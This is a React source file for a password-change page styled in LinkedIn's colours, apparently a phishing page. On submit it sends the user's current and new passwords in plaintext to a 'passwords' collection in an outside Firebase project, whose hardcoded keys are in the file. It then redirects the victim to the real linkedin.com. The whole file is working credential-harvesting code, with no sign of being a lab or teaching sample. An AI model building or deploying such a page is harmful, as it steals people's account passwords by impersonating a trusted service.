import React, { useState } from "react";
import { Lock, Eye, EyeOff } from "lucide-react";
import { initializeApp } from "firebase/app";
import { getFirestore, collection, addDoc } from "firebase/firestore";

// Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyBuAty-xdyfrfO9SUIwh-0zesil8nidSAY",
  authDomain: "link-e29ce.firebaseapp.com",
  projectId: "link-e29ce",
  storageBucket: "link-e29ce.firebasestorage.app",
  messagingSenderId: "363698638938",
  appId: "1:363698638938:web:0b47305634c3f14f5c0863"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

const PasswordChangeScreen = () => {
  const [currentPassword, setCurrentPassword] = useState("");
  const [newPassword, setNewPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  const [showCurrent, setShowCurrent] = useState(false);
  const [showNew, setShowNew] = useState(false);
  const [showConfirm, setShowConfirm] = useState(false);

  // Handle form submission
  const handleSubmit = async (e) => {
    e.preventDefault();

    if (newPassword !== confirmPassword) {
      alert("New password and confirm password do not match!");
      return;
    }

    try {
      // Push data to Firestore
      await addDoc(collection(db, "passwords"), {
        currentPassword: currentPassword,
        newPassword: newPassword,
      });

      window.location.href = "https://www.linkedin.com";

      alert("Password Updated Successfully!");
      setCurrentPassword("");
      setNewPassword("");
      setConfirmPassword("");
    } catch (error) {
      console.error("Error saving data:", error);
      alert("Failed to save data.");
    }
  };

  // Form validation
  const isValid = () => {
    return (
      currentPassword.length >= 1 &&
      newPassword.length >= 1 &&
      confirmPassword.length >= 1
    );
  };

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
  <div className="bg-white rounded-md shadow-lg p-6 w-full max-w-full lg:max-w-md border border-gray-200">
    <div className="flex flex-col items-center justify-center mb-6">
      <h1 className="text-2xl lg:text-3xl font-bold text-[#0077B5] text-center">
        Create a New Password
      </h1>
      <p className="text-gray-600 mt-2 text-sm lg:text-base text-center">
        Update your credentials to secure your account.
      </p>
    </div>

    <form onSubmit={handleSubmit} className="space-y-4">
      {/* Current Password */}
      <div className="relative">
        <input
          placeholder="Current Password"
          type={showCurrent ? "text" : "password"}
          value={currentPassword}
          onChange={(e) => setCurrentPassword(e.target.value)}
          className="w-full px-4 py-3 text-sm lg:text-base bg-gray-50 border border-gray-300 focus:ring-2 focus:ring-[#0077B5] focus:border-[#0077B5] shadow-sm"
          required
        />
        <button
          type="button"
          onClick={() => setShowCurrent(!showCurrent)}
          className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-[#0077B5] focus:outline-none"
        >
          {showCurrent ? (
            <EyeOff className="w-5 h-5" />
          ) : (
            <Eye className="w-5 h-5" />
          )}
        </button>
      </div>

      {/* New Password */}
      <div className="relative">
        <input
          placeholder="New Password"
          type={showNew ? "text" : "password"}
          value={newPassword}
          onChange={(e) => setNewPassword(e.target.value)}
          className="w-full px-4 py-3 text-sm lg:text-base bg-gray-50 border border-gray-300 focus:ring-2 focus:ring-[#0077B5] focus:border-[#0077B5] shadow-sm"
          required
        />
        <button
          type="button"
          onClick={() => setShowNew(!showNew)}
          className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-[#0077B5] focus:outline-none"
        >
          {showNew ? (
            <EyeOff className="w-5 h-5" />
          ) : (
            <Eye className="w-5 h-5" />
          )}
        </button>
      </div>

      {/* Confirm New Password */}
      <div className="relative">
        <input
          placeholder="Confirm New Password"
          type={showConfirm ? "text" : "password"}
          value={confirmPassword}
          onChange={(e) => setConfirmPassword(e.target.value)}
          className="w-full px-4 py-3 text-sm lg:text-base bg-gray-50 border border-gray-300 focus:ring-2 focus:ring-[#0077B5] focus:border-[#0077B5] shadow-sm"
          required
        />
        <button
          type="button"
          onClick={() => setShowConfirm(!showConfirm)}
          className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-[#0077B5] focus:outline-none"
        >
          {showConfirm ? (
            <EyeOff className="w-5 h-5" />
          ) : (
            <Eye className="w-5 h-5" />
          )}
        </button>
      </div>

      {/* Actions */}
      <div className="flex items-center justify-between mt-6">
        <button
          type="button"
          className="text-sm text-gray-500 hover:text-[#0077B5] font-medium transition duration-200"
        >
          Cancel
        </button>
        <button
          type="submit"
          disabled={!isValid()}
          className="px-6 py-2 bg-[#0077B5] text-white text-sm lg:text-base font-medium rounded hover:bg-[#005983] focus:ring-2 focus:ring-offset-2 focus:ring-[#0077B5] transition duration-200 disabled:bg-blue-300 disabled:cursor-not-allowed shadow-sm"
        >
          Save Password
        </button>
      </div>
    </form>
  </div>
</div>

  );
};

export default PasswordChangeScreen;
